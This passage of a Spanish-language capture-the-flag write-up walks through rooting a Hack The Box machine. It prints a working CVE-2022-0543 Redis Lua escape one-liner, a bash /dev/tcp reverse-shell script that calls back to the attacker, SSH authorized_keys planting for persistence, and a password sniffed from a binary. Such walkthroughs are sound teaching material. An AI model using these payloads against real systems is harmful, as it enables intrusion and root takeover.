</span></span></code></pre></div><p>Al cabo de unos segundos..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo pwncat-cs -lp <span style="color:#ae81ff">443</span>
</span></span><span style="display:flex;"><span>/usr/local/lib/python3.11/dist-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;class&#39;</span>: algorithms.Blowfish,
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>12:37:00<span style="color:#f92672">]</span> Welcome to pwncat üêà!                                           __main__.py:164
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>12:37:01<span style="color:#f92672">]</span> received connection from 10.129.250.135:38510                        bind.py:84
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>12:37:01<span style="color:#f92672">]</span> 0.0.0.0:443: normalizing shell path                              manager.py:957
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>12:37:02<span style="color:#f92672">]</span> 10.129.250.135:38510: registered new host w/ db                  manager.py:957
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>local<span style="color:#f92672">)</span> pwncat$ back
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> dan_smith@shared:/opt/scripts_review$ whoami
</span></span><span style="display:flex;"><span>dan_smith
</span></span></code></pre></div><p>Y podemos leer la flag de usuario</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> dan_smith@shared:/home/dan_smith$ cat user.txt 
</span></span><span style="display:flex;"><span>7d60bf7a99bbf213....
</span></span></code></pre></div><p>Al cabo de unos segundos perdemos la conexi√≥n, as√≠ que vamos a agregar mi clave p√∫blica de atacante al <code>/home/dan_smith/.ssh/authorized_keys</code> para asegurar persistencia.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cp /home/pointedsec/.ssh/id_rsa.pub  .
</span></span><span style="display:flex;"><span>‚îå‚îÄ<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>‚îÄ<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>‚îÄ<span style="color:#f92672">[</span>~/Desktop/shared/content<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>‚îî‚îÄ‚îÄ‚ïº <span style="color:#f92672">[</span>‚òÖ<span style="color:#f92672">]</span>$ mv id_rsa.pub authorized_keys
</span></span></code></pre></div><p>Simplemente con <code>pwncat-cs</code> al recibir la conexi√≥n.</p>
<p><code>upload authorized_keys /home/dan_smith/.ssh/authorized_keys</code></p>
<p>Y ya podemos iniciar sesi√≥n mediante SSH.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ssh dan_smith@shared.htb
</span></span><span style="display:flex;"><span>Linux shared 5.10.0-16-amd64 <span style="color:#75715e">#1 SMP Debian 5.10.127-1 (2022-06-30) x86_64</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span style="display:flex;"><span>permitted by applicable law.
</span></span><span style="display:flex;"><span>Last login: Thu Jul <span style="color:#ae81ff">14</span> 14:43:34 <span style="color:#ae81ff">2022</span> from 10.10.14.4
</span></span><span style="display:flex;"><span>dan_smith@shared:~$ whoami
</span></span><span style="display:flex;"><span>dan_smith
</span></span></code></pre></div><h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Vemos que el usuario <code>dan_smith</code> pertenece a un grupo <code>sysadmin</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dan_smith@shared:~$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>dan_smith<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>dan_smith<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>dan_smith<span style="color:#f92672">)</span>,1001<span style="color:#f92672">(</span>developer<span style="color:#f92672">)</span>,1003<span style="color:#f92672">(</span>sysadmin<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Encontramos un archivo asociado a este grupo.</p>
<pre tabindex="0"><code class="language-shel" data-lang="shel">dan_smith@shared:~$ find / -type f -group sysadmin  2&gt;/dev/null 
/usr/local/bin/redis_connector_dev
</code></pre><p>El archivo es de <code>root</code> y cuando lo ejecutamos&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dan_smith@shared:~$ ls -la /usr/local/bin/redis_connector_dev
</span></span><span style="display:flex;"><span>-rwxr-x--- <span style="color:#ae81ff">1</span> root sysadmin <span style="color:#ae81ff">5974154</span> Mar <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">2022</span> /usr/local/bin/redis_connector_dev
</span></span><span style="display:flex;"><span>dan_smith@shared:~$ /usr/local/bin/redis_connector_dev
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Logging to redis instance using password...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>INFO command result:
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Server</span>
</span></span><span style="display:flex;"><span>redis_version:6.0.15
</span></span><span style="display:flex;"><span>redis_git_sha1:00000000
</span></span><span style="display:flex;"><span>redis_git_dirty:0
</span></span><span style="display:flex;"><span>redis_build_id:4610f4c3acf7fb25
</span></span><span style="display:flex;"><span>redis_mode:standalone
</span></span><span style="display:flex;"><span>os:Linux 5.10.0-16-amd64 x86_64
</span></span><span style="display:flex;"><span>arch_bits:64
</span></span><span style="display:flex;"><span>multiplexing_api:epoll
</span></span><span style="display:flex;"><span>atomicvar_api:atomic-builtin
</span></span><span style="display:flex;"><span>gcc_version:10.2.1
</span></span><span style="display:flex;"><span>process_id:3380
</span></span><span style="display:flex;"><span>run_id:1b607241f518d87566ae2fe57dd9eb15095b42fc
</span></span><span style="display:flex;"><span>tcp_port:6379
</span></span><span style="display:flex;"><span>uptime_in_seconds:4
</span></span><span style="display:flex;"><span>uptime_in_days:0
</span></span><span style="display:flex;"><span>hz:10
</span></span><span style="display:flex;"><span>configured_hz:10
</span></span><span style="display:flex;"><span>lru_clock:11751358
</span></span><span style="display:flex;"><span>executable:/usr/bin/redis-server
</span></span><span style="display:flex;"><span>config_file:/etc/redis/redis.conf
</span></span><span style="display:flex;"><span>io_threads_active:0
</span></span><span style="display:flex;"><span> &lt;nil&gt;
</span></span></code></pre></div><p>Me llama la atenci√≥n el mensaje <strong>Logging to redis instance using password&hellip;</strong></p>
<p>Esto significa que la contrase√±a debe de estar o dentro del binario, o por alguna parte de la m√°quina, as√≠ que vamos a descubrirlo.</p>
<p>Nos vamos a traer el binario a nuestra m√°quina.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ file redis_connector_dev
</span></span><span style="display:flex;"><span>redis_connector_dev: ELF 64-bit LSB executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID<span style="color:#f92672">=</span>sdGIDsCGb51jonJ_67fq/_JkvEmzwH9g6f0vQYeDG/iH1iXHhyzaDZJ056wX9s/7UVi3T2i2LVCU8nXlHgr, not stripped
</span></span></code></pre></div><p>Vemos que es un binario ELF compilado en <code>Go</code></p>
<p>Podr√≠amos analizar el binario con <code>ghidra</code> pero como este binario intenta entablar una conexi√≥n por detr√°s, podemos con <code>wireshark</code> capturar el tr√°fico e intentar ver si la contrase√±a viaja en texto claro.</p>
<p>Para que se tramite la autenticaci√≥n, primero se comprueba que existe un servicio redis, por lo cual.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo apt install redis-server
</span></span></code></pre></div><p>Iniciamos el servidor</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ redis-server
</span></span></code></pre></div><p>Y capturamos con <code>wireshark</code> utilizando el siguiente filtro:
<code>tcp.port == 6379</code></p>
<p>Y al ejecutar el binario..
<img src="images/Screenshot_13.png" alt="Write-up Image"></p>
<p><code>F2WHqJUz2WEz=Gqq</code></p>
<p>En la m√°quina v√≠ctima</p>
<p>Podemos comprobar que esta contrase√±a es v√°lida.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dan_smith@shared:~$ redis-cli -h 127.0.0.1
</span></span><span style="display:flex;"><span>127.0.0.1:6379&gt; auth F2WHqJUz2WEz<span style="color:#f92672">=</span>Gqq
</span></span><span style="display:flex;"><span>OK
</span></span><span style="display:flex;"><span>127.0.0.1:6379&gt;
</span></span></code></pre></div><p>Vemos que la versi√≥n de <code>redis-server</code> es la 6.0.15</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>127.0.0.1:6379&gt; info server
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Server</span>
</span></span><span style="display:flex;"><span>redis_version:6.0.15
</span></span></code></pre></div><p>Tras investigar un rato, podemos encontrar un apartado en <code>vulhub</code> que contiene el CVE-2022-0543
<a href="https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md">https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md</a></p>
<p>En este one-liner sucede la magia.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>eval <span style="color:#e6db74">&#39;local io_l = package.loadlib(&#34;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&#34;, &#34;luaopen_io&#34;); local io = io_l(); local f = io.popen(&#34;id&#34;, &#34;r&#34;); local res = f:read(&#34;*a&#34;); f:close(); return res&#39;</span> <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>Y tenemos ejecuci√≥n de comandos como <code>root</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>127.0.0.1:6379&gt; eval <span style="color:#e6db74">&#39;local io_l = package.loadlib(&#34;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&#34;, &#34;luaopen_io&#34;); local io = io_l(); local f = io.popen(&#34;id&#34;, &#34;r&#34;); local res = f:read(&#34;*a&#34;); f:close(); return res&#39;</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;uid=0(root) gid=0(root) groups=0(root)\n&#34;</span>
</span></span></code></pre></div><p>La vulnerabilidad surge debido a una configuraci√≥n incorrecta en el entorno de Lua utilizado por Redis en los paquetes de Debian. Espec√≠ficamente, los paquetes de Redis en Debian no aislaban adecuadamente el entorno de ejecuci√≥n de Lua, permitiendo que scripts Lua accedieran a funciones peligrosas del sistema operativo.</p>
<p>Lua, al estar mal configurado, ten√≠a acceso a ciertas bibliotecas internas de Lua que permiten la ejecuci√≥n de c√≥digo arbitrario</p>
<p><strong><code>package.loadlib</code> y <code>ffi</code></strong>: Estas bibliotecas permiten cargar bibliotecas din√°micas del sistema y ejecutar c√≥digo nativo, lo que un atacante puede utilizar para ejecutar c√≥digo arbitrario en el servidor Redis.</p>
<p>Vamos a ganar la consola como <code>root</code></p>
<p>Nos ponemos en escucha con <code>pwncat-cs</code> por el puerto 443</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo pwncat-cs -lp <span style="color:#ae81ff">443</span>
</span></span></code></pre></div><p>En la m√°quina v√≠ctima nos creamos un peque√±o script <code>rev.sh</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dan_smith@shared:/tmp$ cat /dev/shm/rev.sh
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.91/443 0&gt;&amp;1&#34;</span>
</span></span></code></pre></div><p>Ejecutamos este script desde <code>redis</code> aprovech√°ndonos de la vulnerabilidad encontrada anteriormente..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>127.0.0.1:6379&gt; eval <span style="color:#e6db74">&#39;local io_l = package.loadlib(&#34;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&#34;, &#34;luaopen_io&#34;); local io = io_l(); local f = io.popen(&#34;bash /dev/shm/rev.sh&#34;, &#34;r&#34;); local res = f:read(&#34;*a&#34;); f:close(); return res&#39;</span> <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>local<span style="color:#f92672">)</span> pwncat$ back
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> root@shared:/var/lib/redis# id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Podr√≠amos leer la flag de <code>root</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> root@shared:/var/lib/redis# cd /root
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> root@shared:/root# ls
</span></span><span style="display:flex;"><span>c.sh  root.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> root@shared:/root# cat root.txt
</span></span><span style="display:flex;"><span>567b0aecc4a8a5d4c...
</span></span></code></pre></div><p>¬°Y ya estar√≠a!</p>
<p>Happy Hacking! üöÄ</p>

    </div>

    

            </div>
        </div><footer class="text-center pb-1">
    <small class="text-muted">
        
            &copy; 2024, Andr√©s Del Cerro
        
        <br>
        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
    </small>
</footer>
</body>
</html>
